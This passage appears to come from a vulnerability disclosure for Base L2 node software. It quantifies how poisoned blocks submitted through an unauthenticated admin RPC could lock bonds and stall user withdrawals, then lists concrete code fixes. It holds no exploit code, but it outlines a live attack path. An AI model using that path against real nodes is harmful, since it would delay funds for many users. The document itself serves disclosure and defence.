  * On Base mainnet today, adjacent game types (`GameTypes.CANNON`, `CANNON_KONA`) carry `initBonds = 0.08 ETH` (`0x011c37937e080000`), confirmed by the executed upgrade-18 transaction. The mainnet `AggregateVerifier` bond has not yet been announced but is expected to be in the same 0.05–0.08 ETH range. Every poisoned proposal locks one bond in `DelayedWETH` under the corrupted game until Guardian blacklist.
* **Value delayed per stalled L2 height**: the full set of pending L2→L1 withdrawals finalizing at or after the poisoned block's L2 epoch is held until manual remediation. Base L2 has consistently >$1B TVL and runs \~7-day finality windows today. A single corrupted block that passes the bypass is sufficient to stall withdrawals for all users trying to exit through that height.
* **Persistence**: even after the operator reorgs the bad block out of the unsafe head, the bogus `rootClaim` already submitted to L1 by the poisoned proposer sits on-chain inside an `AggregateVerifier` clone, consuming a live bond and a dispute-game slot until explicitly invalidated.

### Suggested fix

1. **`crates/consensus/service/src/actors/rpc/actor.rs:119-123`** — gate the `AdminRpc` merge on `self.config.enable_admin()` so the CLI flag actually does what its name claims:

   ```rust
   if self.config.enable_admin() {
       if let Some(network_admin) = network_admin {
           modules.merge(AdminRpc::new(self.sequencer_admin_rpc_client, network_admin).into_rpc())?;
       }
   }
   ```
2. **`crates/client/cli/src/rpc.rs:25`** — change the default `--rpc.addr` to `127.0.0.1`. The admin RPC is an operator tool, not an Internet-facing service.
3. **`crates/consensus/rpc/src/admin.rs:70-81`** — add a JWT check to `admin_post_unsafe_payload` (align with `engine_*` API conventions) or gate it on a sequencer signer key.
4. **`crates/execution/node/src/engine.rs:130`** — resolve the `FIXME`: pass the in-memory engine tree into the validator so the `state_by_block_hash` fallback can be satisfied, or fail closed (`return Err(ConsensusError::Other("parent state not available for isthmus withdrawals_root check"))`). Never silently skip a consensus check.

Any one of (1), (2), or (3) closes the remote-attacker reachability. Fix (4) closes the logical-skip even in legitimate sync scenarios and should be applied in addition.
